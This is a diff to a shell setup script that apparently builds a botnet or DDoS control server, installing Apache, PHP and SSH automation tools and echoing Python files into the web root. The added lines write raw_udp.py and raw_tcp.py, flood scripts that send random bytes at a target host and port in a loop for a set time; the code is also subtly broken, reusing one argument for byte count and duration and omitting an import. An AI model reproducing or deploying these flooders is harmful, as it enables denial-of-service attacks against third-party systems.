@@ -14,7 +14,8 @@ if [ $(echo $DISTRO | grep -i "CentOs" | wc -l) -eq 1 ]; then
         python get-pip.py
         pip install ipgetter
         pip install paralell-ssh
-        pip install pxssh
+        pip install pexpect
+        
 
 
 elif [ $(echo $DISTRO | grep -i "Debian" | wc -l) -eq 1 ]; then
@@ -26,7 +27,7 @@ elif [ $(echo $DISTRO | grep -i "Debian" | wc -l) -eq 1 ]; then
         apt-get install python-pip -y 
         pip install ipgetter 
         pip install paralell-ssh
-        pip install pxssh
+        pip install pexpect
         
 elif [ $(echo $DISTRO | grep -i "Ubuntu" | wc -l) -eq 1 ]; then
         apt-get install php libapache2-mod-php php-mcrypt php-mysql -y
@@ -37,7 +38,7 @@ elif [ $(echo $DISTRO | grep -i "Ubuntu" | wc -l) -eq 1 ]; then
         apt-get install python-pip -y 
         pip install ipgetter
         pip install paralell-ssh
-        pip install pxssh
+        pip install pexpect
         
 else
         echo "Unknown OS"
@@ -75,3 +76,26 @@ echo "sock.connect((HOST, PORT))" >> /var/www/html/feed.py
 echo "sock.send(ACTION)" >> /var/www/html/feed.py
 echo "sock.close()" >> /var/www/html/feed.py
 
+echo "import sys, socket, random" > /var/www/html/raw_udp.py
+echo "DHOST = sys.argv[1]" >> /var/www/html/raw_udp.py
+echo "DPORT = int(sys.argv[2])" >> /var/www/html/raw_udp.py
+echo "BYTES = int(sys.argv[3])" >> /var/www/html/raw_udp.py
+echo "TIME_AMT = int(sys.argv[3])" >> /var/www/html/raw_udp.py
+echo "bytes=random._urandom(BYTES)" >> /var/www/html/raw_udp.py
+echo "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); now = time.clock()" >> /var/www/html/raw_udp.py
+echo "while (time.clock() - now) < TIME_AMT:" >> /var/www/html/raw_udp.py
+echo "    try:" >> /var/www/html/raw_udp.py
+echo "        sock.sendto(bytes,(DHOST, DPORT))" >> /var/www/html/raw_udp.py
+echo "    except: pass" >> /var/www/html/raw_udp.py
+
+echo "import sys, socket, random" > /var/www/html/raw_tcp.py
+echo "DHOST = sys.argv[1]" >> /var/www/html/raw_tcp.py
+echo "DPORT = int(sys.argv[2])" >> /var/www/html/raw_tcp.py
+echo "BYTES = int(sys.argv[3])" >> /var/www/html/raw_tcp.py
+echo "TIME_AMT = int(sys.argv[3])" >> /var/www/html/raw_tcp.py
+echo "bytes=random._urandom(BYTES)" >> /var/www/html/raw_tcp.py
+echo "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); now = time.clock()" >> /var/www/html/raw_tcp.py
+echo "while (time.clock() - now) < TIME_AMT:" >> /var/www/html/raw_tcp.py
+echo "    try:" >> /var/www/html/raw_tcp.py
+echo "        sock.sendto(bytes,(DHOST, DPORT))" >> /var/www/html/raw_tcp.py
+echo "    except: pass" >> /var/www/html/raw_tcp.py
